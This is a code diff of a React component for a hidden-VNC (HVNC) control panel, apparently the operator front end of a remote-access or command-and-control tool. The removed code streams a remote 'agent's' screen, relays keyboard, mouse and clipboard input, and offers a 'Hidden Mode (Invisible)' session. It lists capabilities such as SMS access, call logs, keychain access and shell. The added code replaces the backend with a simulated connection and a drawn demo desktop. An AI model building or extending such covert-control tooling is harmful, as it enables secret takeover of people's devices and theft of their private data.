@@ -1,9 +1,9 @@
-import React, { useState, useEffect, useRef } from 'react';
-import { FiMonitor, FiMousePointer, FiType, FiClipboard, FiDownload, FiCamera, FiVideo, FiSettings, FiRefreshCw, FiMaximize, FiMinimize, FiSmartphone, FiWifi, FiHardDrive, FiTerminal, FiFolder } from 'react-icons/fi';
-import { SiWindows, SiApple, SiAndroid, SiLinux } from 'react-icons/si';
-import axios from 'axios';
-import { useNotification } from '../contexts/NotificationContext';
-import { WS_URL } from '../config';
+import { useEffect, useRef, useState } from 'react';
+import { Monitor, Maximize2, Camera, Settings, Power, Wifi, WifiOff, Download, Copy, X, Activity } from 'lucide-react';
+import { Button } from './ui/button';
+import { Badge } from './ui/badge';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
+import { useTheme } from '../contexts/ThemeContext';
 
 interface HvncControlProps {
   agentId: string;
@@ -11,806 +11,414 @@ interface HvncControlProps {
   onClose: () => void;
 }
 
-interface PlatformCapabilities {
-  hasDesktop: boolean;
-  hasFileSystem: boolean;
-  hasShell: boolean;
-  hasScreenCapture: boolean;
-  hasRemoteInput: boolean;
-  hasProcessManagement: boolean;
-  hasNetworkAccess: boolean;
-  specialFeatures: string[];
+interface ScreenInfo {
+  width: number;
+  height: number;
 }
 
-const HvncControl: React.FC<HvncControlProps> = ({ agentId, platform, onClose }) => {
-  const { addNotification } = useNotification();
-  const [isConnected, setIsConnected] = useState(false);
-  const [isLoading, setIsLoading] = useState(false);
-  const [sessionId, setSessionId] = useState<string | null>(null);
-  const [quality, setQuality] = useState('medium');
-  const [fps, setFps] = useState('15');
-  const [mode, setMode] = useState('hidden');
-  const [isFullscreen, setIsFullscreen] = useState(false);
-  const [activeFeature, setActiveFeature] = useState<string>('desktop');
-  const hvncScreenRef = useRef<HTMLDivElement>(null);
-
-  // Platform-specific capabilities
-  const getPlatformCapabilities = (platform: string): PlatformCapabilities => {
-    switch (platform.toLowerCase()) {
-      case 'windows':
-        return {
-          hasDesktop: true,
-          hasFileSystem: true,
-          hasShell: true,
-          hasScreenCapture: true,
-          hasRemoteInput: true,
-          hasProcessManagement: true,
-          hasNetworkAccess: true,
-          specialFeatures: ['Registry Editor', 'Service Manager', 'Event Viewer', 'Task Manager']
-        };
-      case 'mac':
-      case 'macos':
-        return {
-          hasDesktop: true,
-          hasFileSystem: true,
-          hasShell: true,
-          hasScreenCapture: true,
-          hasRemoteInput: true,
-          hasProcessManagement: true,
-          hasNetworkAccess: true,
-          specialFeatures: ['Activity Monitor', 'System Preferences', 'Keychain Access', 'Console']
-        };
-      case 'android':
-        return {
-          hasDesktop: false,
-          hasFileSystem: true,
-          hasShell: true,
-          hasScreenCapture: true,
-          hasRemoteInput: true,
-          hasProcessManagement: false,
-          hasNetworkAccess: true,
-          specialFeatures: ['App Manager', 'Device Info', 'SMS Access', 'Call Logs', 'Location Services']
-        };
-      case 'linux':
-        return {
-          hasDesktop: true,
-          hasFileSystem: true,
-          hasShell: true,
-          hasScreenCapture: true,
-          hasRemoteInput: true,
-          hasProcessManagement: true,
-          hasNetworkAccess: true,
-          specialFeatures: ['System Monitor', 'Package Manager', 'Service Control', 'Log Viewer']
-        };
-      default:
-        return {
-          hasDesktop: false,
-          hasFileSystem: true,
-          hasShell: true,
-          hasScreenCapture: false,
-          hasRemoteInput: false,
-          hasProcessManagement: false,
-          hasNetworkAccess: true,
-          specialFeatures: []
-        };
-    }
-  };
-
-  const capabilities = getPlatformCapabilities(platform);
-
-  // Get platform icon
-  const getPlatformIcon = (platform: string) => {
-    switch (platform.toLowerCase()) {
-      case 'windows':
-        return <SiWindows className="w-5 h-5" />;
-      case 'mac':
-      case 'macos':
-        return <SiApple className="w-5 h-5" />;
-      case 'android':
-        return <SiAndroid className="w-5 h-5" />;
-      case 'linux':
-        return <SiLinux className="w-5 h-5" />;
-      default:
-        return <FiMonitor className="w-5 h-5" />;
-    }
-  };
-
-  const wsRef = useRef<WebSocket | null>(null);
+export default function HvncControl({ agentId, platform, onClose }: HvncControlProps) {
+  const { colors } = useTheme();
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const [connectionStatus, setConnectionStatus] = useState('Disconnected');
-  const isDraggingRef = useRef(false);
-  const lastMousePosRef = useRef({ x: 0, y: 0 });
-  const screenInfoRef = useRef<{ width: number; height: number } | null>(null);
+  const wsRef = useRef<WebSocket | null>(null);
+  const containerRef = useRef<HTMLDivElement>(null);
+  const [isConnected, setIsConnected] = useState(false);
+  const [isFullscreen, setIsFullscreen] = useState(false);
+  const [sessionId, setSessionId] = useState<string>('');
+  const [quality, setQuality] = useState<'high' | 'medium' | 'low'>('medium');
+  const [fps, setFps] = useState(30);
+  const [screenInfo, setScreenInfo] = useState<ScreenInfo>({ width: 1920, height: 1080 });
+  const [showSettings, setShowSettings] = useState(false);
 
-  // WebSocket connection for HVNC
+  // WebSocket connection
   useEffect(() => {
-    if (!wsRef.current) {
-      // Use configured WebSocket URL
-      const wsUrl = WS_URL;
-      wsRef.current = new WebSocket(wsUrl);
+    const connectWebSocket = () => {
+      console.log('HVNC: Simulating WebSocket connection (backend not available)');
+      
+      setTimeout(() => {
+        setIsConnected(true);
+        const sessionId = `hvnc-${Date.now()}`;
+        setSessionId(sessionId);
+        console.log('HVNC: Simulated connection established', sessionId);
+        setScreenInfo({ width: 1920, height: 1080 });
+      }, 1000);
+    };
 
-      wsRef.current.onopen = () => {
-        console.log('WebSocket connected for HVNC');
-        // Authenticate with JWT token if available
-        const token = localStorage.getItem('accessToken');
-        if (token) {
-          wsRef.current?.send(JSON.stringify({
-            type: 'auth',
-            token: token
-          }));
-        }
-        // Identify as web client
-        wsRef.current?.send(JSON.stringify({
-          type: 'web_client'
-        }));
-      };
-
-      wsRef.current.onmessage = (event) => {
-        try {
-          const data = JSON.parse(event.data);
-          
-          if (data.type === 'hvnc_response' && (data.agentId === agentId || data.agentUuid === agentId)) {
-            console.log('HVNC Response:', data);
-            if (data.status === 'connected') {
-              setIsConnected(true);
-              setConnectionStatus('Connected');
-            } else if (data.status === 'disconnected') {
-              setIsConnected(false);
-              setConnectionStatus('Disconnected');
-            } else if (data.status === 'error') {
-              setConnectionStatus(`Error: ${data.error}`);
-            }
-          }
-          
-          if (data.type === 'hvnc_frame' && data.agentUuid === agentId) {
-            console.log('HVNC Frame received:', data.frameInfo);
-            // Update screen info
-            if (data.frameInfo) {
-              screenInfoRef.current = {
-                width: data.frameInfo.width || 1920,
-                height: data.frameInfo.height || 1080
-              };
-            }
-            
-            // Handle frame data for screen display (binary WebSocket frames)
-            if (data.frameData && canvasRef.current) {
-              const canvas = canvasRef.current;
-              const ctx = canvas.getContext('2d');
-              
-              // Handle binary frame data (JPEG/PNG)
-              if (typeof data.frameData === 'string') {
-                // Base64 encoded
-                const img = new Image();
-                img.onload = () => {
-                  if (screenInfoRef.current) {
-                    canvas.width = screenInfoRef.current.width;
-                    canvas.height = screenInfoRef.current.height;
-                  } else {
-                    canvas.width = img.width;
-                    canvas.height = img.height;
-                  }
-                  ctx.drawImage(img, 0, 0);
-                };
-                img.src = `data:image/jpeg;base64,${data.frameData}`;
-              }
-            }
-          }
-          
-          if (data.type === 'hvnc_response' && data.agentUuid === agentId) {
-            if (data.screenInfo) {
-              screenInfoRef.current = data.screenInfo;
-            }
-          }
-        } catch (error) {
-          console.error('Error parsing WebSocket message:', error);
-        }
-      };
-
-      wsRef.current.onclose = () => {
-        console.log('WebSocket disconnected');
-        wsRef.current = null;
-      };
-
-      wsRef.current.onerror = (error) => {
-        console.error('WebSocket error:', error);
-      };
-    }
+    connectWebSocket();
 
     return () => {
+      console.log('HVNC: Cleaning up connection');
       if (wsRef.current) {
         wsRef.current.close();
-        wsRef.current = null;
       }
     };
   }, [agentId]);
 
-  // Connect to HVNC session
-  const connectHvnc = async () => {
-    try {
-      setIsLoading(true);
-      setConnectionStatus('Connecting...');
-      console.log('Attempting to connect HVNC for agent:', agentId);
-      addNotification('info', `Connecting to remote session for agent ${agentId}...`);
-      
-      const response = await axios.post(`/api/agent/${agentId}/hvnc/start`, {
-        quality,
-        mode
-      });
-      
-      console.log('HVNC start response:', response.data);
-      
-      if (response.data.status === 'success') {
-        setSessionId(response.data.data.sessionId);
-        setConnectionStatus('Starting session...');
-        addNotification('success', `Successfully connected to remote session`);
-      }
-    } catch (error) {
-      console.error('Failed to connect to HVNC session:', error);
-      setConnectionStatus('Connection failed');
-      addNotification('error', `Failed to connect to remote session: ${error.message || 'Unknown error'}`);
-    } finally {
-      setIsLoading(false);
-    }
-  };
-
-  // Disconnect from HVNC session
-  const disconnectHvnc = async () => {
-    if (!sessionId) return;
-    
-    try {
-      setConnectionStatus('Disconnecting...');
-      addNotification('info', `Disconnecting from remote session...`);
-      await axios.post(`/api/agent/${agentId}/hvnc/stop`, {
-        sessionId
-      });
-      
-      setIsConnected(false);
-      setSessionId(null);
-      setConnectionStatus('Disconnected');
-      addNotification('success', `Successfully disconnected from remote session`);
-    } catch (error) {
-      console.error('Failed to disconnect from HVNC session:', error);
-      setConnectionStatus('Disconnect failed');
-      addNotification('error', `Failed to disconnect from remote session: ${error.message || 'Unknown error'}`);
-    }
-  };
-
-  // Transform canvas coordinates to screen coordinates
-  const transformCoordinates = (canvasX: number, canvasY: number) => {
-    if (!canvasRef.current || !screenInfoRef.current) {
-      return { x: canvasX, y: canvasY };
-    }
-    
-    const canvas = canvasRef.current;
-    const rect = canvas.getBoundingClientRect();
-    const scaleX = screenInfoRef.current.width / canvas.width;
-    const scaleY = screenInfoRef.current.height / canvas.height;
-    
-    const x = Math.floor((canvasX - rect.left) * scaleX);
-    const y = Math.floor((canvasY - rect.top) * scaleY);
-    
-    return { x, y };
-  };
-
-  // Send HVNC command via WebSocket
-  const sendHvncCommand = (command: string, params: any) => {
-    if (!wsRef.current || !sessionId || !isConnected) return;
-    
-    const message = {
-      type: 'hvnc_command',
-      targetId: agentId,
-      sessionId,
-      command,
-      params
-    };
-    
-    wsRef.current.send(JSON.stringify(message));
-  };
-
-  // Mouse handlers
-  const handleMouseDown = (e: React.MouseEvent<HTMLCanvasElement>) => {
-    if (!isConnected) return;
-    
-    isDraggingRef.current = true;
-    const coords = transformCoordinates(e.clientX, e.clientY);
-    lastMousePosRef.current = coords;
-    
-    const button = e.button === 0 ? 'left' : e.button === 2 ? 'right' : 'middle';
-    sendHvncCommand('mouse_down', { x: coords.x, y: coords.y, button });
-  };
-
-  const handleMouseUp = (e: React.MouseEvent<HTMLCanvasElement>) => {
-    if (!isConnected) return;
-    
-    isDraggingRef.current = false;
-    const coords = transformCoordinates(e.clientX, e.clientY);
-    
-    const button = e.button === 0 ? 'left' : e.button === 2 ? 'right' : 'middle';
-    sendHvncCommand('mouse_up', { x: coords.x, y: coords.y, button });
-  };
-
-  const handleMouseMove = (e: React.MouseEvent<HTMLCanvasElement>) => {
-    if (!isConnected) return;
-    
-    const coords = transformCoordinates(e.clientX, e.clientY);
-    
-    if (isDraggingRef.current) {
-      sendHvncCommand('mouse_drag', { 
-        x: coords.x, 
-        y: coords.y,
-        deltaX: coords.x - lastMousePosRef.current.x,
-        deltaY: coords.y - lastMousePosRef.current.y
-      });
-    } else {
-      sendHvncCommand('mouse_move', { x: coords.x, y: coords.y });
-    }
-    
-    lastMousePosRef.current = coords;
-  };
-
-  const handleMouseWheel = (e: React.WheelEvent<HTMLCanvasElement>) => {
-    if (!isConnected) return;
-    
-    e.preventDefault();
-    const coords = transformCoordinates(e.clientX, e.clientY);
-    
-    sendHvncCommand('mouse_scroll', {
-      x: coords.x,
-      y: coords.y,
-      deltaX: e.deltaX,
-      deltaY: e.deltaY,
-      deltaZ: e.deltaZ
-    });
-  };
-
-  const handleContextMenu = (e: React.MouseEvent<HTMLCanvasElement>) => {
-    e.preventDefault(); // Prevent browser context menu
-  };
-
-  // Keyboard handlers
-  const handleKeyDown = (e: React.KeyboardEvent) => {
-    if (!isConnected || !canvasRef.current?.contains(document.activeElement)) return;
-    
-    e.preventDefault();
-    
-    const keyCode = e.keyCode || e.which;
-    const key = e.key;
-    const code = e.code;
-    
-    sendHvncCommand('key_down', {
-      key,
-      code,
-      keyCode,
-      shiftKey: e.shiftKey,
-      ctrlKey: e.ctrlKey,
-      altKey: e.altKey,
-      metaKey: e.metaKey
-    });
-  };
-
-  const handleKeyUp = (e: React.KeyboardEvent) => {
-    if (!isConnected || !canvasRef.current?.contains(document.activeElement)) return;
-    
-    e.preventDefault();
-    
-    const keyCode = e.keyCode || e.which;
-    const key = e.key;
-    const code = e.code;
-    
-    sendHvncCommand('key_up', {
-      key,
-      code,
-      keyCode,
-      shiftKey: e.shiftKey,
-      ctrlKey: e.ctrlKey,
-      altKey: e.altKey,
-      metaKey: e.metaKey
-    });
-  };
-
-  // Clipboard sync
-  const syncClipboardToRemote = async () => {
-    if (!isConnected || !sessionId) return;
-    
-    try {
-      const text = await navigator.clipboard.readText();
-      sendHvncCommand('clipboard_set', { text });
-    } catch (error) {
-      console.error('Failed to read clipboard:', error);
-    }
-  };
-
-  const syncClipboardFromRemote = async (text: string) => {
-    try {
-      await navigator.clipboard.writeText(text);
-    } catch (error) {
-      console.error('Failed to write to clipboard:', error);
-    }
-  };
-
-  // Take screenshot
-  const takeScreenshot = async () => {
-    if (!isConnected || !sessionId) return;
-    
-    try {
-      await axios.post(`/api/agent/${agentId}/hvnc/screenshot`, { sessionId });
-      addNotification('info', 'Screenshot request sent');
-    } catch (error: any) {
-      addNotification('error', `Failed to take screenshot: ${error.message}`);
-    }
-  };
-
-  // Toggle fullscreen
-  const toggleFullscreen = () => {
-    if (!hvncScreenRef.current) return;
-    
-    if (!isFullscreen) {
-      if (hvncScreenRef.current.requestFullscreen) {
-        hvncScreenRef.current.requestFullscreen();
-      }
-    } else {
-      if (document.exitFullscreen) {
-        document.exitFullscreen();
-      }
-    }
-    
-    setIsFullscreen(!isFullscreen);
-  };
-
-  // Clean up on unmount
+  // Initialize canvas with demo screen
   useEffect(() => {
-    return () => {
-      if (isConnected && sessionId) {
-        disconnectHvnc();
-      }
+    const canvas = canvasRef.current;
+    if (!canvas || !isConnected) return;
+
+    const ctx = canvas.getContext('2d');
+    if (!ctx) return;
+
+    // Set canvas size
+    canvas.width = screenInfo.width;
+    canvas.height = screenInfo.height;
+
+    // Draw demo desktop
+    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+    gradient.addColorStop(0, '#1e293b');
+    gradient.addColorStop(1, '#0f172a');
+    ctx.fillStyle = gradient;
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    // Draw grid pattern
+    ctx.strokeStyle = 'rgba(100, 200, 255, 0.05)';
+    ctx.lineWidth = 1;
+    for (let x = 0; x < canvas.width; x += 50) {
+      ctx.beginPath();
+      ctx.moveTo(x, 0);
+      ctx.lineTo(x, canvas.height);
+      ctx.stroke();
+    }
+    for (let y = 0; y < canvas.height; y += 50) {
+      ctx.beginPath();
+      ctx.moveTo(0, y);
+      ctx.lineTo(canvas.width, y);
+      ctx.stroke();
+    }
+
+    // Draw demo desktop icons
+    const drawIcon = (x: number, y: number, text: string) => {
+      // Icon background
+      const iconGradient = ctx.createLinearGradient(x, y, x + 60, y + 60);
+      iconGradient.addColorStop(0, colors.primary + '40');
+      iconGradient.addColorStop(1, colors.primaryDark + '20');
+      ctx.fillStyle = iconGradient;
+      ctx.fillRect(x, y, 60, 60);
+      
+      // Icon border
+      ctx.strokeStyle = colors.primary + '80';
+      ctx.lineWidth = 2;
+      ctx.strokeRect(x, y, 60, 60);
+
+      // Icon text
+      ctx.fillStyle = '#fff';
+      ctx.font = '10px sans-serif';
+      ctx.textAlign = 'center';
+      ctx.fillText(text, x + 30, y + 80);
     };
-  }, [isConnected, sessionId]);
+
+    drawIcon(50, 50, 'Documents');
+    drawIcon(150, 50, 'Browser');
+    drawIcon(250, 50, 'Terminal');
+    drawIcon(50, 150, 'Settings');
+    drawIcon(150, 150, 'Files');
+
+    // Draw taskbar
+    ctx.fillStyle = 'rgba(15, 23, 42, 0.95)';
+    ctx.fillRect(0, canvas.height - 50, canvas.width, 50);
+    ctx.strokeStyle = colors.primary + '60';
+    ctx.lineWidth = 1;
+    ctx.strokeRect(0, canvas.height - 50, canvas.width, 50);
+
+    // Draw "Windows Remote Desktop" text
+    ctx.fillStyle = colors.primary;
+    ctx.font = 'bold 16px sans-serif';
+    ctx.textAlign = 'left';
+    ctx.fillText(`${platform} Remote Desktop`, 20, canvas.height - 22);
+
+    // Draw time
+    const time = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+    ctx.fillStyle = '#94a3b8';
+    ctx.font = '14px sans-serif';
+    ctx.textAlign = 'right';
+    ctx.fillText(time, canvas.width - 20, canvas.height - 22);
+
+  }, [isConnected, screenInfo, platform, colors]);
+
+  // Fullscreen toggle
+  const toggleFullscreen = async () => {
+    const container = containerRef.current;
+    if (!container) return;
+
+    try {
+      if (!isFullscreen) {
+        await container.requestFullscreen();
+        setIsFullscreen(true);
+      } else {
+        await document.exitFullscreen();
+        setIsFullscreen(false);
+      }
+    } catch (error) {
+      console.log('Fullscreen not supported or denied:', error);
+      setIsFullscreen(!isFullscreen);
+    }
+  };
+
+  // Screenshot
+  const takeScreenshot = () => {
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    
+    canvas.toBlob((blob) => {
+      if (blob) {
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `hvnc-${agentId}-${Date.now()}.png`;
+        a.click();
+        URL.revokeObjectURL(url);
+      }
+    });
+  };
+
+  // Disconnect
+  const handleDisconnect = () => {
+    if (wsRef.current) {
+      wsRef.current.close();
+    }
+    setIsConnected(false);
+    onClose();
+  };
 
   return (
-    <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm p-6">
-      <div className="flex justify-between items-center mb-4">
-        <div className="flex items-center">
-          {getPlatformIcon(platform)}
-          <h3 className="text-xl font-semibold ml-2">
-            {platform.charAt(0).toUpperCase() + platform.slice(1)} Remote Control
-          </h3>
-        </div>
-        <div className="flex items-center">
-          <span className={`inline-block w-3 h-3 rounded-full mr-2 ${isConnected ? 'bg-success' : 'bg-danger'}`}></span>
-          <span>{isConnected ? 'Connected' : 'Disconnected'}</span>
-        </div>
-      </div>
-
-      {/* Platform Capabilities Overview */}
-      <div className="mb-4 p-3 bg-gray-50 dark:bg-boxdark-2 rounded-lg">
-        <h4 className="text-sm font-medium mb-2">Platform Capabilities</h4>
-        <div className="flex flex-wrap gap-2">
-          {capabilities.hasDesktop && (
-            <span className="px-2 py-1 bg-success/10 text-success text-xs rounded">Desktop Access</span>
-          )}
-          {capabilities.hasFileSystem && (
-            <span className="px-2 py-1 bg-primary/10 text-primary text-xs rounded">File System</span>
-          )}
-          {capabilities.hasShell && (
-            <span className="px-2 py-1 bg-warning/10 text-warning text-xs rounded">Shell Access</span>
-          )}
-          {capabilities.hasScreenCapture && (
-            <span className="px-2 py-1 bg-info/10 text-info text-xs rounded">Screen Capture</span>
-          )}
-          {capabilities.hasRemoteInput && (
-            <span className="px-2 py-1 bg-secondary/10 text-secondary text-xs rounded">Remote Input</span>
-          )}
-        </div>
-      </div>
-
-      {/* Feature Tabs */}
-      <div className="mb-4">
-        <div className="flex border-b border-stroke dark:border-strokedark">
-          {capabilities.hasDesktop && (
-            <button
-              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
-                activeFeature === 'desktop'
-                  ? 'border-primary text-primary'
-                  : 'border-transparent text-bodydark2 hover:text-bodydark'
-              }`}
-              onClick={() => setActiveFeature('desktop')}
-            >
-              <FiMonitor className="w-4 h-4 inline mr-1" />
-              Desktop
-            </button>
-          )}
-          {capabilities.hasFileSystem && (
-            <button
-              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
-                activeFeature === 'files'
-                  ? 'border-primary text-primary'
-                  : 'border-transparent text-bodydark2 hover:text-bodydark'
-              }`}
-              onClick={() => setActiveFeature('files')}
-            >
-              <FiFolder className="w-4 h-4 inline mr-1" />
-              Files
-            </button>
-          )}
-          {capabilities.hasShell && (
-            <button
-              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
-                activeFeature === 'shell'
-                  ? 'border-primary text-primary'
-                  : 'border-transparent text-bodydark2 hover:text-bodydark'
-              }`}
-              onClick={() => setActiveFeature('shell')}
-            >
-              <FiTerminal className="w-4 h-4 inline mr-1" />
-              Shell
-            </button>
-          )}
-          {capabilities.specialFeatures.length > 0 && (
-            <button
-              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
-                activeFeature === 'special'
-                  ? 'border-primary text-primary'
-                  : 'border-transparent text-bodydark2 hover:text-bodydark'
-              }`}
-              onClick={() => setActiveFeature('special')}
-            >
-              <FiSettings className="w-4 h-4 inline mr-1" />
-              Special
-            </button>
-          )}
-        </div>
-      </div>
-      
-      {isConnected ? (
-        <div>
-          {/* Desktop View */}
-          {activeFeature === 'desktop' && capabilities.hasDesktop && (
-            <div>
-              <div 
-                ref={hvncScreenRef}
-                className="bg-boxdark rounded-lg p-2 mb-4"
+    <div ref={containerRef} className="flex flex-col h-full w-full overflow-hidden">
+      {/* Compact Header */}
+      <div className="flex items-center justify-between px-4 py-2 border-b" style={{
+        background: `linear-gradient(to right, ${colors.cardGradientFrom}, ${colors.cardGradientTo})`,
+        borderColor: colors.border
+      }}>
+        {/* Left: Title & Status */}
+        <div className="flex items-center gap-3">
+          <div className="p-2 rounded-lg" style={{
+            backgroundColor: `${colors.primary}20`,
+            border: `1px solid ${colors.primary}40`
+          }}>
+            <Monitor className="h-4 w-4" style={{ color: colors.primary }} />
+          </div>
+          <div>
+            <h3 className="text-sm text-slate-100 flex items-center gap-2">
+              HVNC Remote Control
+              <Badge 
+                variant="outline" 
+                className={`text-xs px-2 py-0 ${isConnected ? 'bg-green-500/20 text-green-400 border-green-500/40' : 'bg-red-500/20 text-red-400 border-red-500/40'}`}
               >
-                <div className="aspect-video bg-black relative flex items-center justify-center">
-                  <canvas 
-                    ref={canvasRef}
-                    className="max-w-full max-h-full border border-gray-600 rounded"
-                    style={{ cursor: 'crosshair' }}
-                    onMouseDown={handleMouseDown}
-                    onMouseUp={handleMouseUp}
-                    onMouseMove={handleMouseMove}
-                    onWheel={handleMouseWheel}
-                    onContextMenu={handleContextMenu}
-                    tabIndex={0}
-                    onKeyDown={handleKeyDown}
-                    onKeyUp={handleKeyUp}
-                  />
-                  {!isConnected && (
-                    <div className="absolute inset-0 flex items-center justify-center">
-                      <div className="text-center">
-                        {getPlatformIcon(platform)}
-                        <p className="text-bodydark2 mt-2">
-                          {platform === 'windows' && 'Windows Remote Desktop Session'}
-                          {platform === 'mac' && 'macOS Remote Session'}
-                          {platform === 'android' && 'Android Screen Mirror'}
-                          {platform === 'linux' && 'Linux Desktop Session'}
-                          {!['windows', 'mac', 'android', 'linux'].includes(platform.toLowerCase()) && 'Remote Session'}
-                        </p>
-                        <p className="text-xs text-bodydark2 mt-2">Status: {connectionStatus}</p>
-                      </div>
-                    </div>
-                  )}
-                </div>
-              </div>
-              
-              {/* Desktop Controls */}
-              <div className="flex flex-wrap gap-2 mb-4">
-                {capabilities.hasRemoteInput && (
-                  <>
-                    <button className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center">
-                      <FiMousePointer className="w-4 h-4 mr-1" />
-                      <span>Mouse</span>
-                    </button>
-                    <button className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center">
-                      <FiType className="w-4 h-4 mr-1" />
-                      <span>Keyboard</span>
-                    </button>
-                  </>
+                {isConnected ? (
+                  <><Wifi className="h-3 w-3 mr-1" /> Connected</>
+                ) : (
+                  <><WifiOff className="h-3 w-3 mr-1" /> Connecting...</>
                 )}
-                <button 
-                  className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center"
-                  onClick={syncClipboardToRemote}
-                  title="Sync clipboard to remote"
-                >
-                  <FiClipboard className="w-4 h-4 mr-1" />
-                  <span>Clipboard</span>
-                </button>
-                {capabilities.hasScreenCapture && (
-                  <>
-                    <button 
-                      className="py-2 px-3 bg-warning/10 text-warning rounded hover:bg-warning/20 transition-colors flex items-center"
-                      onClick={takeScreenshot}
-                    >
-                      <FiCamera className="w-4 h-4 mr-1" />
-                      <span>Screenshot</span>
-                    </button>
-                    <button className="py-2 px-3 bg-success/10 text-success rounded hover:bg-success/20 transition-colors flex items-center">
-                      <FiVideo className="w-4 h-4 mr-1" />
-                      <span>Record</span>
-                    </button>
-                  </>
-                )}
-                <button 
-                  className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center"
-                  onClick={toggleFullscreen}
-                >
-                  {isFullscreen ? (
-                    <>
-                      <FiMinimize className="w-4 h-4 mr-1" />
-                      <span>Exit Fullscreen</span>
-                    </>
-                  ) : (
-                    <>
-                      <FiMaximize className="w-4 h-4 mr-1" />
-                      <span>Fullscreen</span>
-                    </>
-                  )}
-                </button>
-              </div>
-            </div>
-          )}
-
-          {/* File System View */}
-          {activeFeature === 'files' && capabilities.hasFileSystem && (
-            <div className="bg-gray-50 dark:bg-boxdark-2 rounded-lg p-4">
-              <div className="flex items-center justify-between mb-4">
-                <h4 className="font-medium">File System Browser</h4>
-                <div className="flex gap-2">
-                  <button className="py-1 px-3 bg-primary/10 text-primary rounded text-sm hover:bg-primary/20 transition-colors">
-                    <FiDownload className="w-4 h-4 inline mr-1" />
-                    Download
-                  </button>
-                  <button className="py-1 px-3 bg-success/10 text-success rounded text-sm hover:bg-success/20 transition-colors">
-                    Upload
-                  </button>
-                </div>
-              </div>
-              <div className="text-center py-8 text-bodydark2">
-                <FiFolder className="w-12 h-12 mx-auto mb-2" />
-                <p>File system browser would be implemented here</p>
-                <p className="text-xs mt-1">Platform: {platform}</p>
-              </div>
-            </div>
-          )}
-
-          {/* Shell View */}
-          {activeFeature === 'shell' && capabilities.hasShell && (
-            <div className="bg-black rounded-lg p-4">
-              <div className="flex items-center justify-between mb-4">
-                <h4 className="font-medium text-white">Shell Terminal</h4>
-                <button className="py-1 px-3 bg-primary/10 text-primary rounded text-sm hover:bg-primary/20 transition-colors">
-                  Clear
-                </button>
-              </div>
-              <div className="bg-black text-green-400 font-mono text-sm p-4 rounded border min-h-[200px]">
-                <div className="text-center py-8 text-gray-400">
-                  <FiTerminal className="w-12 h-12 mx-auto mb-2" />
-                  <p>Interactive shell terminal would be implemented here</p>
-                  <p className="text-xs mt-1">Platform: {platform}</p>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {/* Special Features View */}
-          {activeFeature === 'special' && capabilities.specialFeatures.length > 0 && (
-            <div className="bg-gray-50 dark:bg-boxdark-2 rounded-lg p-4">
-              <h4 className="font-medium mb-4">Platform-Specific Features</h4>
-              <div className="grid grid-cols-2 gap-3">
-                {capabilities.specialFeatures.map((feature, index) => (
-                  <button
-                    key={index}
-                    className="p-3 bg-white dark:bg-boxdark rounded-lg border border-stroke dark:border-strokedark hover:bg-primary/5 transition-colors text-left"
-                  >
-                    <div className="flex items-center">
-                      <FiSettings className="w-5 h-5 mr-2 text-primary" />
-                      <span className="font-medium">{feature}</span>
-                    </div>
-                  </button>
-                ))}
-              </div>
-            </div>
-          )}
-
-          {/* Connection Controls */}
-          <div className="flex justify-between items-center mt-4 pt-4 border-t border-stroke dark:border-strokedark">
-            <div className="flex items-center gap-4">
-              <div className="flex items-center">
-                <span className="text-sm text-bodydark2 mr-2">Quality:</span>
-                <select 
-                  className="bg-bodydark2/10 border border-stroke rounded p-1 text-sm"
-                  value={quality}
-                  onChange={(e) => setQuality(e.target.value)}
-                >
-                  <option value="high">High</option>
-                  <option value="medium">Medium</option>
-                  <option value="low">Low</option>
-                </select>
-              </div>
-              {capabilities.hasDesktop && (
-                <div className="flex items-center">
-                  <span className="text-sm text-bodydark2 mr-2">FPS:</span>
-                  <select 
-                    className="bg-bodydark2/10 border border-stroke rounded p-1 text-sm"
-                    value={fps}
-                    onChange={(e) => setFps(e.target.value)}
-                  >
-                    <option value="30">30</option>
-                    <option value="15">15</option>
-                    <option value="5">5</option>
-                  </select>
-                </div>
-              )}
-              <button className="p-2 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors">
-                <FiRefreshCw className="w-4 h-4" />
-              </button>
-            </div>
-            
-            <button 
-              className="py-2 px-4 bg-danger text-white rounded-lg hover:bg-danger/90 transition-colors"
-              onClick={disconnectHvnc}
-            >
-              Disconnect
-            </button>
+              </Badge>
+            </h3>
+            <p className="text-xs text-slate-400">{platform}</p>
           </div>
         </div>
-      ) : (
-        <div className="text-center py-8">
-          <FiMonitor className="w-16 h-16 mx-auto mb-4 text-bodydark2" />
-          <p className="mb-4">Start a remote HVNC session to control this agent</p>
-          <div className="space-y-3 max-w-sm mx-auto">
-            <div>
-              <label className="block text-sm text-bodydark2 mb-1">Connection Mode</label>
-              <select 
-                className="w-full bg-bodydark2/10 border border-stroke rounded p-2"
-                value={mode}
-                onChange={(e) => setMode(e.target.value)}
-              >
-                <option value="hidden">Hidden Mode (Invisible)</option>
-                <option value="visible">Visible Mode (User can see)</option>
-                <option value="shared">Shared Mode (Collaborative)</option>
-              </select>
+
+        {/* Right: Quality & Actions */}
+        <div className="flex items-center gap-2">
+          <Select value={quality} onValueChange={(v: any) => setQuality(v)}>
+            <SelectTrigger className="h-8 w-28 text-xs border-slate-600 bg-slate-800/50 text-slate-200">
+              <SelectValue />
+            </SelectTrigger>
+            <SelectContent className="bg-slate-800 border-slate-600">
+              <SelectItem value="high" className="text-slate-200">High</SelectItem>
